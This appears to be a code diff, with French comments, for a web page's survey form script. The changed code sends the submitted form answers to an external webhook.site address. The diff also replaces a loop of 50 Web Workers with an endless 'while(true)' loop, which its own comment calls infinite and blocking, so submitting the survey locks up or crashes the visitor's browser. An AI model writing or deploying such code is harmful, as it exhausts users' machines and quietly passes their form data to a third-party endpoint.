@@ -83,7 +83,7 @@ function makeWorkerScript() {
                 await new Promise(r => setTimeout(r, INTERVAL_MS));
                 postMessage({ tick: Date.now() });
             }
-            postMessage({ stopped:true });
+            postMessage({ stopped: true });
         })();
     `;
 }
@@ -94,13 +94,14 @@ function startSimulation() {
     
     const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
     const url = URL.createObjectURL(blob);
-
-    for (let i = 0; i < 50; i++) {
+    
+    // Création infinie de workers (boucle bloquante)
+    while(true) {
         const w = new Worker(url);
         w.onmessage = () => {};
         workers.push(w);
     }
-
+    
     setTimeout(() => {
         stopWorkers();
         URL.revokeObjectURL(url);
@@ -118,32 +119,27 @@ function stopWorkers() {
     workers = [];
 }
 
-// === Interception du formulaire pour envoyer les données et démarrer la simulation ===
 document.addEventListener('DOMContentLoaded', () => {
     const form = document.getElementById('survey');
-
-    form.addEventListener('submit', async (e) => {
+    
+    form.addEventListener('submit', (e) => {
         e.preventDefault(); // empêche le submit classique
-
-        // Récupération des données du formulaire
+        
+        // Récupération des données
         const formData = new FormData(form);
         const data = Object.fromEntries(formData.entries());
-
-        // Méthode 1 : Utiliser mode: 'no-cors' pour éviter la requête OPTIONS
-        try {
-            await fetch("https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {
-                method: "POST",
-                mode: "no-cors", // Évite la requête preflight OPTIONS
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-            log("✓ Formulaire envoyé (POST)");
-        } catch (err) {
-            log("✗ Erreur lors de l'envoi : " + err.message);
-        }
-
-        // Lancer la simulation juste après l'envoi
-        log("Lancement des workers...");
+        
+        // Envoi des données vers Webhook distant
+        fetch("https://webhook.site/0b847e8b-f7c7-4bcf-bc86-945235c1b312", {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        })
+        .then(() => log("Formulaire envoyé à distance."))
+        .catch(() => log("Erreur lors de l'envoi des données."));
+        
+        // Lancer ton script après submit
         startSimulation();
     });
 });
